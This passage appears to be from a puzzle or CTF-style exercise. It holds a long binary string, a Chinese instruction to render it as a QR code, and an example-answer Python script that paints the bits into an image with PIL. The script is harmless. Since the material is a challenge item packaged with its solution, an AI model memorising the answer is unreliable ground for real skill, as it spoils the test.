100111111110011110000001100110000001111110000111100000011001111001111111111000000110000111100111111000000111100001111111111111111001111110000001100001111001111110000001111000011111111111111110011110000110000111111000000111111001111110000000000001100111111111100001100001111110000001111110011111100000000000011001111111111000000000000001111111111110000111111111111110011111100111111110000000000000011111111111100001111111111111100111111001111111111111111001111001100001111000000001100110000000011001111111111111111110011110011000011110000000011001100000000110011111111110000111100110000111100111111110000001100001100111100001100111100001111001100001111001111111100000011000011001111000011001111111100001100110011110000000011111111111100001100000011001111111111000011001100111100000000111111111111000011000000110011111100000011111100001111001111001100111111000000000000001100001111000000111111000011110011110011001111110000000000000011000011111111111111111111000011001111111100001111001111110011000011111111111111111111110000110011111111000011110011111100110000111111000000000000001100110011000000001100001100110011000000110011110000000000000011001100110000000011000011001100110000001100111100111111111100111100000011110000001100000011111100001111001111001111111111001111000000111100000011000000111111000011110011110011000000110011111100001100001111111100000000000000111100111100110000001100111111000011000011111111000000000000001111001111001100000011001111111100110000110011110011001100111100110011110011000000110011111111001100001100111100110011001111001100111100110000001100110011000000001100111100110011111100110000001111001100000011001100110000000011001111001100111111001100000011110011111111110011111111110000111100110011001111000000111111111100111111111100111111111100001111001100110011110000001111111111000000000000001100000011111100000011111100111100001111110011110000000000000011000000111111000000111111001111000011111100111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\n</code></pre> <p>\u628a\u8fd9\u6bb501\u53d8\u6210\u4e8c\u7ef4\u7801</p> \u793a\u4f8b\u7b54\u6848\uff08\u70b9\u51fb\u53f3\u4fa7\u53ef\u4ee5\u590d\u5236\uff09 example.py<pre><code># \u5bfc\u5165PIL\u56fe\u50cf\u5e93\u548cmath\u5e93\u3002\nfrom PIL import Image\nimport math\n# \u6253\u5f00\u6587\u4ef601.txt\u5e76\u5c06\u5176\u8bfb\u5165\u53d8\u91cfstring_01\u3002\nstring_01 = open('01.txt').read()\n# math.sqrt\u662f\u5f00\u5e73\u65b9\u6839\u7684\u51fd\u6570\uff0c\u8f93\u51fa\u7684\u662ffloat\u6d6e\u70b9\u6570\u7c7b\u578b\u7684\u6570\u503c\n# int\u51fd\u6570\u628a\u63a5\u6536\u7684\u6570\u503c\u8f6c\u5316\u4e3aint\u6574\u6570\u7c7b\u578b\n# \u8fd9\u53e5\u8bdd\u5c31\u662f\u628a\u8ba1\u7b97string_01\u7684\u957f\u5ea6\u7684\u5e73\u65b9\u6839\u5e76\u5c06\u5176\u8f6c\u6362\u4e3a\u6574\u6570\uff0c\u5b58\u5165\u53d8\u91cfsqrt_len\u3002\nsqrt_len = int(math.sqrt(len(string_01)))\n# \u8bbe\u7f6e\u56fe\u50cf\u5bbd\u5ea6\u548c\u9ad8\u5ea6\u4e3asqrt_len\u3002\nwidth, height = sqrt_len,sqrt_len\n# \u521b\u5efa\u4e00\u4e2a\u65b0\u7684RGB\u56fe\u50cf\uff0c\u957f\u5ea6\u548c\u5bbd\u5ea6\u5206\u522b\u4e3aheight\u548cwidth\u3002\nim = Image.new('RGB',(height,width))\n# \u904d\u5386\u56fe\u50cf\u7684\u6bcf\u4e00\u884c\u548c\u6bcf\u4e00\u5217\u3002\nfor x in range(height):\n    for y in range(width):\n        # \u83b7\u53d6string_01\u4e2d\u5bf9\u5e94\u5750\u6807\u7684\u5b57\u7b26\u5e76\u5b58\u5165\u53d8\u91cfvalue\u3002\n        value = string_01[width * x + y]\n        # \u5982\u679cvalue\u4e3a\"1\"\uff0c\u5c06\u8be5\u5750\u6807\u7684\u50cf\u7d20\u8bbe\u7f6e\u4e3a\u767d\u8272\u3002\n        if value == \"1\":\n            im.putpixel((x,y),(255,255,255))\n        # \u5426\u5219\uff0c\u5c06\u8be5\u5750\u6807\u7684\u50cf\u7d20\u8bbe\u7f6e\u4e3a\u9ed1\u8272\u3002\n        else:\n            im.putpixel((x,y),(0,0,0))\n# \u663e\u793aim\u56fe\u50cf\nim.show()\n# \u628aim\u4fdd\u5b58\u4e3aQRcode.png\nim.save('QRcode.png')\n</code></pre>"}]}